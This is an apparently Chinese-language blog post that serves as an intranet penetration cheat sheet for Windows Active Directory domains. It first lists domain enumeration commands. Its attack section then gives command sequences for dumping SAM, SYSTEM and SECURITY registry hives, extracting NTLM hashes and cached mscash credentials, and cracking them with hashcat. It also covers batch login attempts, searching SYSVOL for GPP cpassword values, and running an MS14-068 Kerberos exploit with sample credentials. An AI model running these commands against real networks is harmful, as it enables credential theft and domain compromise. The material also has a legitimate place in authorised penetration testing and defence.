---
title: "Intranet Introduction"
date: 2019-08-09T16:04:58+08:00
lastmod: 2019-08-09T16:04:58+08:00
draft: false
tags: [内网渗透]
categories: [内网渗透]
comment: true
---
内网基础入门
<!--more-->
# 内网入门
## 基本介绍与信息获取
### 基本介绍
```
c:\windows\NTDS 全称ntds.dit（存储域内账户hash）
```
```
C:\Windows\system32\config\ SAM Hash  存储windows用户hash
```
```
c:\windows\SYSOL Sysvol文件夹
```
```
Administrator 用户 管理计算机（域）的内置账户
```
```
Domain Admins 指定的域管理员
```
```
Domain Computers 加入到域中的所有工作站和服务器
```
```
Domain Controllers 域中所有域控制器
```
```
Domain Guests 域的所有来宾
```
```
Domain Users 所有域用户
```
```
Enterprise Admins 企业的指定系统管理员（加入可以访问任何域资源）
```
```
krbtgt 服务账户（密钥分发中心&&不可以登陆）
```
```
\\domain\Netlogon目录 这个目录里存放的是域用户登录脚本，很多用户目录映射、打印机设置等操作的脚本都放在这里，这个目录是普通域用户权限就可读的。大部分时间能获得各个部门的共享文件夹，文件服务器目录，运气好时甚至能得到一些账号密码
```
### 基础信息获取
```
net user /domain 域用户
```
```
net Administrator /domain 域管理员
```
```
net user 本机用户
```
```
net localhroup administrators 本机管理员[通常含有域用户]
```
```
net group /domain 查询域工作组
```
```
net group "domain admins" /domain 查询域管理员用户组
```
```
net localgroup administrators /domain 登录本机的域管理员
```
```
net localgroup administrators workgroup\user001 /add 域用户添加到本机
```

```
net group "Domain controllers" 查看域控制器(如果有多台)
```
 ```
 net group “enterprise admins” /domain  获得企业管理员列表
 ```
```
 net localgroup administrators /domain 获取域内置administrators组用户，这个组内成员包含enterprise admins与domain admins，权限一样
```
```
 net group “domain controllers” /domain 获得域控制器列表
```
```
net group “domain computers” /domain 获得所有域成员计算机列表
```
```
net user someuser /domain 获得指定账户someuser的详细信息
```
```
net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息
```     
```
nltest /domain_trusts 获取域信任信息
```
```
ipconfig /all   查询本机IP段，所在域等
```
```
net view 查询同一域内机器列表
```
```
net view /domain  查询域列表
```
```
net config workstation 判断是否在域内
``` 
```
systeminfo 判断是否在域内
```
```
net view /domain:domainname  查看workgroup域中计算机列表
```
```
net time /domain 判断主域，主域服务器都做时间服务器 
```
```
net config workstation 当前登录域 
```
```
net session  查看当前会话
``` 
```
net use \\ip\ipc$ pawword /user:username 建立IPC会话[空连接] 
```
```
net share   查看SMB指向的路径[即共享]
```
```
net view   查询同一域内机器列表
``` 
```
net view \\ip   查询某IP共享
```
```
net view /domain  查询域列表
```
```
net view /domain:domainname    查看workgroup域中计算机列表 
```
```
net start  查看当前运行的服务 
```
```
net accounts  查看本地密码策略 
```
```
net accounts /domain  查看域密码策略
``` 
```
nbtstat –A ip netbios 查询 
```
```
netstat –an/ano/anb 网络连接查询 
```
```
route print  路由表
```

### 详细信息获取
```
ldifde -u -f output.ldf 导出域内所有信息
```
```
csvde -u -f ouput.csv 导出域内所有信息
```
```
csvde.exe/ldifde.exe -u -r "(sAMAccountType=805306368)" -l sAMAccountName,displayname,lastlogon,pwdLastSet,description,mail,homedirectory,scriptpath -f output.csv 查询所有用户
```
```
dsquery computer获得域内所有计算机列表，输出为DN
```
```
dsquery server 获得所有域控制器
```
```
dsquery user 获得所有域用户
```
```
dsquery user | dsget user -samid -display -email 获得所有域用户
```
```
dsquery group 获得所有用户组
```
```
dsquery subnet 获得所有子网
```
```
dsquery site 获得所有站点
```
```
dsquery * forestroot -filter "(sAMAccountType=805306368)" -attr sAMAccountName displaynamedescription
查询所有用户
```
```
AdFind.exe -default -f "(sAMAccountType=805306368)" sAMAccountName displayname lastlogon pwdLastSet mail homedirectory scriptpath -int8time lastlogon;pwdlastset 所有用户信息
```

### 非域成员访问域控制器
```
csvde/ldifde -s servername -b username Domain password -f output.txt
```
```
dsquery * forestroot -s servername -u username -p password -filter "(sAMAccountType=805306368)" -attr sAMAccountName displayname description
```

```
adfind -h servername -u Domai\usernmae -up password -default -f "(sAMAccountType=805306368)" sAMAccountName displayname lastlogon pwdLastSet mail homedirectory scriptpath -int8time lastlogon;pwdlastset
```
### winfo

```
winfo 192.168.1.4 查看其他机器信息
```

## 常见攻击方法
### 用户登陆迭代
- 导出注册表

```
reg save hklm\sam sam.hive & reg save hklm\system system.hive & reg save hklm\security security.hive 导出注册表
```
- 导出hash

```
pwdump.py system.hive sam.hive
https://github.com/Neohapsis/creddump7
```

- 破解hash

```
http://www.hashkiller.co.uk/ntlm-decrypter.aspx
```

- 收集服务器

```
dsquery * -filter "&(sAMAccountType=805306369)" -attr cn 收集所有计算机
```

```
dsquery * -filter "&(sAMAccountType=805306369)(OperatingSystem=*server*)" -attr cn 收集服务器
```
- 尝试批量登陆

```
LoginTester.bat
https://github.com/Twi1ight/AD-Pentest-Script
```
>-s指定机器名列表
-i指定ip地址段，暂时只支持C段，ip地址格式形如192.168.1.5-250
-u指定账号密码文件，账号密码用冒号分隔
-o指定输出文件
-d指定域名，如果账号只本地用户则不需要指定这个参数

```
logintester.bat -s server.txt -u server.txt -o output.txt
```

### 域登录缓存mscash

- 导出注册表

```
reg save hklm\sam sam.hive & reg save hklm\system system.hive & reg save hklm\security security.hive 导出注册表
```

- Creddump7提取mscash

```
cachedump.py system.hive securityhive true (2003 false)
```

- 查看用户状态

```
net user username /domain
```
```
ldifde.exe -u -r "(sAMAccountName=adminjk)" -l pwdLastSet -s pdc.test.ad -b john test.ad Passw0rd. -f out.txt 

w32tm /ntte 130XXXXXXX 查询完使用w32tm转化时间格式
```
```
AdFind.exe -u pdc.test.ad -u test.ad\john -up Passw0rd. -default -f "(sAMAccountName=adminjk)" pwdLastSet userAccountControl -int8time pwdLastSet
```
 >userAccountControl
  [AD 用户属性userAccountControl的详细解释 ](http://blog.sina.com.cn/s/blog_a1c8858c0101f73i.html)
  [userAccountControl](http://blog.sina.com.cn/s/blog_a1c8858c0101f73i.html
https://support.microsoft.com/zh-cn/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties)

- hashcat跑密码

```
hashcat -a 3 -m 2100 --force ‘$DCC2$10240#adminjk#259108604cb524e8c044d5cda274bae1’
```
### GPP（组策略漏洞）
>受影响文件
**Groups.xml, Services\Services.xml ScheduledTasks\ScheduledTasks.xml Printers\Printers.xml Drives\Drives.xml DataSources\DataSources.xml**

> 文件中查找类似的字符串
cpassword=“j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw”

- 查看SYSVOL目录

```
net view \\域控制器
```

- 测试是否有访问权限

```
dir \\域控制器\sysvol
```
- 查找危险文件

```
dir \\域控制器\sysvol /s /a >sysvol.txt
```

- 查看危险文件内容

```
type \\域控制器\sysvol\文件名
```

- 脚本解密

### MS14-68 kerberos

 **可以参考我的另一篇文章**
 
 [IPC MS14068 Pth Ptt Ptk Kerberoating](https://syst1m.com/post/ipc-ms14068-pth-ptt-ptk-kerberoating/)

```
域用户获取sid whoami /user
```
```
本地用户获取sid  dsquery user –s 192.168.1.111 –u test\john –p Passw0rd. –name john* | dsget user –s 192.168.1.111 –u test\john –p Passw0rd. –sid 
```
```
 ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>
 ms14-068.py -u john@test.ad -s S-1-5-21-1729408145-521730468-1409314830-1104 -d 192.168.1.111 -p Passw0rd.
```